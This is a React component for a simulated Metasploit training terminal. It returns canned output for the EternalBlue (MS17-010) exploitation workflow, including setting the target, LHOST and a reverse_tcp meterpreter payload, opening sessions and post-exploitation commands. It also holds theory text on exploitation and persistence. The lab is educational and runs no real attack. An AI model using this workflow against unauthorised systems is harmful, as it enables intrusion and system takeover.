import { useState , useRef} from "react";

export default function MetasploitImmersiveLab() {
  const [cmd, setCmd] = useState("");
  const [log, setLog] = useState([
    "METASPLOIT EXPLOITATION ENVIRONMENT v1.0",
    "Type 'help' to view available commands.",
  ]);

  const msfStarted = useRef(false);
const exploitLoaded = useRef(false);
const configured = useRef(false);
const sessionActive = useRef(false);
const inSession = useRef(false);

const simulateMSF = (input) => {

  input = input.replace(/^msf6\s*>\s*/, "").trim();

  // START FRAMEWORK
  if (input === "msfconsole") {
    msfStarted.current = true;
    return [
      "Metasploit Framework started.",
      "msf6 >"
    ];
  }

  if (!msfStarted.current)
    return ["Start Metasploit first using msfconsole."];

  // SEARCH
  if (input.startsWith("search")) {
    return [
      "Matching Modules:",
      "exploit/windows/smb/ms17_010_eternalblue",
      "auxiliary/scanner/smb/smb_version"
    ];
  }

  // USE EXPLOIT
  if (input.startsWith("use")) {
    exploitLoaded.current = true;
    return [
      "Exploit module loaded.",
      "msf6 exploit(ms17_010_eternalblue) >"
    ];
  }

  // SHOW OPTIONS
  if (input === "show options") {
    if (!exploitLoaded.current)
      return ["No module selected."];
    return [
      "RHOSTS   Target address",
      "LHOST    Local address",
      "PAYLOAD  Payload type"
    ];
  }

  // SHOW PAYLOADS
  if (input === "show payloads") {
    return [
      "Compatible payloads:",
      "windows/x64/meterpreter/reverse_tcp"
    ];
  }

  // SET VALUES
  if (input.startsWith("set RHOSTS"))
    return ["RHOSTS configured"];

  if (input.startsWith("set LHOST"))
    return ["LHOST configured"];

  if (input.startsWith("set PAYLOAD")) {
    configured.current = true;
    return ["Payload selected"];
  }

  // EXPLOIT
  if (input === "exploit" || input === "run") {
    if (!configured.current)
      return ["Exploit not fully configured."];

    sessionActive.current = true;

    return [
      "Launching exploit...",
      "Payload delivered.",
      "Meterpreter session 1 opened"
    ];
  }

  // SESSIONS LIST
  if (input === "sessions") {
    if (!sessionActive.current)
      return ["No active sessions."];

    return ["1  meterpreter  192.168.1.10"];
  }

  // INTERACT SESSION
  if (input === "sessions -i 1") {
    if (!sessionActive.current)
      return ["Session not found."];

    inSession.current = true;
    return ["Interacting with session 1", "meterpreter >"];
  }

  // POST EXPLOIT
  if (inSession.current) {

    if (input === "sysinfo")
      return [
        "Computer: WIN-TARGET",
        "OS: Windows 10 x64"
      ];

    if (input === "getuid")
      return ["NT AUTHORITY\\SYSTEM"];

    if (input === "shell")
      return ["Command shell opened."];

    if (input === "background") {
      inSession.current = false;
      return ["Session backgrounded.", "msf6 >"];
    }
  }

  // EXIT
  if (input === "exit") {
    msfStarted.current = false;
    exploitLoaded.current = false;
    configured.current = false;
    sessionActive.current = false;
    inSession.current = false;
    return ["Metasploit closed."];
  }

  return ["Unknown msf command."];
};
  const execute = () => {
    if (!cmd.trim()) return;

    const input = cmd.trim();

    // 💣 MSF COMMANDS
    if (input === "msfconsole" || msfStarted.current) {
  const res = simulateMSF(input);
  setLog([...log, `$ ${input}`, ...res]);
  setCmd("");
  return;
}
    let output = [];

    switch (input) {
      case "help":
        output = [
          "Available commands:",
          "theory   — Exploitation theory",
          "install  — Installation guide",
          "commands — Metasploit manual",
          "task     — Mission objective",
          "",
          "Start with: msfconsole",
        ];
        break;

      case "theory":
  output = [
    "================ EXPLOITATION & METASPLOIT THEORY ================",
    "",
    "1) WHAT IS EXPLOITATION?",
    "",
    "Exploitation is the phase where an attacker takes advantage",
    "of a vulnerability to execute unauthorized actions on a system.",
    "",
    "Goal:",
    "  • Execute code remotely",
    "  • Gain system access",
    "  • Escalate privileges",
    "  • Maintain persistence",
    "",
    "Without exploitation, vulnerabilities remain unused weaknesses.",
    "",
    "------------------------------------------------------------------",
    "2) VULNERABILITY vs EXPLOIT vs PAYLOAD",
    "",
    "VULNERABILITY:",
    "  A flaw in software or configuration.",
    "",
    "EXPLOIT:",
    "  Code that triggers the vulnerability.",
    "",
    "PAYLOAD:",
    "  Code executed AFTER exploitation succeeds.",
    "",
    "Flow:",
    "",
    "  Vulnerability → Exploit → Payload → Control",
    "",
    "------------------------------------------------------------------",
    "3) REMOTE vs LOCAL EXPLOITATION",
    "",
    "REMOTE:",
    "  Attack performed over network.",
    "  No prior system access required.",
    "",
    "LOCAL:",
    "  Requires existing access.",
    "  Used for privilege escalation.",
    "",
    "------------------------------------------------------------------",
    "4) ATTACK LIFECYCLE CONTEXT",
    "",
    "Full cyber attack chain:",
    "",
    "Recon → Enumeration → Exploitation → Post-Exploitation",
    "",
    "Metasploit operates primarily in the last two phases.",
    "",
    "------------------------------------------------------------------",
    "5) HOW EXPLOITS WORK (CONCEPTUAL)",
    "",
    "Many exploits target memory vulnerabilities:",
    "",
    "• Buffer overflow",
    "• Use-after-free",
    "• Race conditions",
    "• Injection flaws",
    "",
    "Example (buffer overflow concept):",
    "",
    "Program allocates fixed memory buffer.",
    "Attacker sends oversized input → overwrites control data.",
    "",
    "Result:",
    "Program execution redirected to attacker-controlled code.",
    "",
    "------------------------------------------------------------------",
    "6) WHAT IS METASPLOIT FRAMEWORK?",
    "",
    "Metasploit is a modular exploitation platform that provides:",
    "",
    "  • Exploit modules",
    "  • Payloads",
    "  • Auxiliary scanners",
    "  • Encoders",
    "  • Post-exploitation tools",
    "",
    "It automates complex attack processes.",
    "",
    "------------------------------------------------------------------",
    "7) MODULE TYPES IN METASPLOIT",
    "",
    "Exploit Modules:",
    "  Execute vulnerability attacks.",
    "",
    "Payload Modules:",
    "  Provide access/control after exploitation.",
    "",
    "Auxiliary Modules:",
    "  Scanning, fuzzing, information gathering.",
    "",
    "Post Modules:",
    "  Actions after gaining access.",
    "",
    "------------------------------------------------------------------",
    "8) PAYLOAD TYPES",
    "",
    "BIND SHELL:",
    "  Target opens port → attacker connects.",
    "",
    "REVERSE SHELL:",
    "  Target connects back to attacker.",
    "  Bypasses firewall restrictions.",
    "",
    "METERPRETER:",
    "  Advanced in-memory payload with extensive control.",
    "",
    "------------------------------------------------------------------",
    "9) SESSION MANAGEMENT",
    "",
    "After successful exploitation:",
    "",
    "Attacker gains a session:",
    "  • Shell access",
    "  • Meterpreter control",
    "  • File system access",
    "",
    "Multiple compromised systems can be managed simultaneously.",
    "",
    "------------------------------------------------------------------",
    "10) PRIVILEGE ESCALATION",
    "",
    "Initial access may be limited.",
    "",
    "Attackers attempt to obtain:",
    "  • Administrator/root privileges",
    "  • Full system control",
    "",
    "Methods include exploiting local vulnerabilities or misconfigurations.",
    "",
    "------------------------------------------------------------------",
    "11) POST-EXPLOITATION ACTIVITIES",
    "",
    "Once inside, attackers may:",
    "",
    "  • Extract credentials",
    "  • Install backdoors",
    "  • Move laterally across network",
    "  • Exfiltrate sensitive data",
    "  • Disable security controls",
    "",
    "------------------------------------------------------------------",
    "12) PERSISTENCE",
    "",
    "Attackers attempt to maintain long-term access:",
    "",
    "  • Scheduled tasks",
    "  • Startup scripts",
    "  • Hidden accounts",
    "  • Rootkits",
    "",
    "------------------------------------------------------------------",
    "13) DEFENSIVE PERSPECTIVE",
    "",
    "Understanding exploitation helps defenders:",
    "",
    "  • Patch vulnerabilities",
    "  • Detect attack attempts",
    "  • Harden systems",
    "  • Implement intrusion detection",
    "",
    "------------------------------------------------------------------",
    "14) LEGAL & ETHICAL USE",
    "",
    "Metasploit must only be used in:",
    "",
    "  • Authorized penetration testing",
    "  • Controlled labs",
    "  • Defensive research",
    "",
    "Unauthorized use is illegal.",
    "",
    "------------------------------------------------------------------",
    "END OF THEORY MODULE",
    "Type 'commands' to begin exploitation operations.",
  ];
  break;

      case "install":
        output = [
          "Linux: preinstalled in Kali",
          "Windows: install via metasploit.com",
          "Run: msfconsole",
        ];
        break;

      case "commands":
  output = [
    "================ METASPLOIT OPERATIONAL DOCTRINE ================",
    "",
    "STEP 1 — START FRAMEWORK",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  msfconsole",
    "",
    "WHEN:",
    "  Beginning exploitation operations.",
    "",
    "WHY:",
    "  Initializes Metasploit environment.",
    "",
    "------------------------------------------------------------------",
    "STEP 2 — SEARCH FOR EXPLOITS",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  search smb",
    "  search eternalblue",
    "",
    "WHEN:",
    "  After identifying vulnerable service.",
    "",
    "WHY:",
    "  Locates modules targeting the vulnerability.",
    "",
    "------------------------------------------------------------------",
    "STEP 3 — SELECT EXPLOIT",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  use exploit/windows/smb/ms17_010_eternalblue",
    "",
    "WHY:",
    "  Loads exploit into active context.",
    "",
    "------------------------------------------------------------------",
    "STEP 4 — VIEW REQUIRED OPTIONS",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  show options",
    "",
    "WHY:",
    "  Displays parameters that must be configured.",
    "",
    "COMMAND:",
    "  show payloads",
    "",
    "WHY:",
    "  Lists compatible payloads.",
    "",
    "------------------------------------------------------------------",
    "STEP 5 — CONFIGURE TARGET",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  set RHOSTS <target-ip>",
    "",
    "WHY:",
    "  Specifies victim machine.",
    "",
    "COMMAND:",
    "  set LHOST <local-ip>",
    "",
    "WHY:",
    "  Address for reverse connection.",
    "",
    "COMMAND:",
    "  set PAYLOAD windows/x64/meterpreter/reverse_tcp",
    "",
    "WHY:",
    "  Defines post-exploitation control method.",
    "",
    "------------------------------------------------------------------",
    "STEP 6 — VERIFY CONFIGURATION",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  show options",
    "",
    "WHY:",
    "  Ensures parameters are correctly set.",
    "",
    "------------------------------------------------------------------",
    "STEP 7 — LAUNCH EXPLOIT",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  exploit",
    "  run",
    "",
    "WHEN:",
    "  After configuration is complete.",
    "",
    "WHY:",
    "  Executes attack against target.",
    "",
    "------------------------------------------------------------------",
    "STEP 8 — SESSION MANAGEMENT",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  sessions",
    "",
    "WHY:",
    "  Lists compromised systems.",
    "",
    "COMMAND:",
    "  sessions -i 1",
    "",
    "WHY:",
    "  Interacts with session.",
    "",
    "------------------------------------------------------------------",
    "STEP 9 — POST-EXPLOITATION",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  sysinfo   → View system details",
    "  getuid    → Current privilege level",
    "  shell     → Spawn command shell",
    "  background → Return to msfconsole",
    "",
    "------------------------------------------------------------------",
    "STEP 10 — EXIT FRAMEWORK",
    "------------------------------------------------------------------",
    "COMMAND:",
    "  exit",
    "",
    "WHY:",
    "  Terminates Metasploit session.",
    "",
    "==================================================================",
    "Type commands exactly as shown to execute.",
  ];
  break;

      case "task":
        output = [
          "MISSION:",
          "Exploit SMB vulnerability on target.",
          "Gain remote session access.",
        ];
        break;

      default:
        output = ["Unknown command"];
    }

    setLog([...log, `$ ${input}`, ...output]);
    setCmd("");
  };

  return (
    <div className="h-screen bg-black text-green-400 font-mono p-4 flex flex-col">

      <div className="flex-1 overflow-y-auto whitespace-pre-wrap">
        {log.map((line, i) => (
          <div key={i}>{line}</div>
        ))}
      </div>

      <div className="flex items-center border-t border-green-700 pt-2">
        <span className="mr-2">$</span>
        <input
          value={cmd}
          onChange={(e) => setCmd(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && execute()}
          className="flex-1 bg-transparent outline-none"
          autoFocus
        />
      </div>
    </div>
  );
}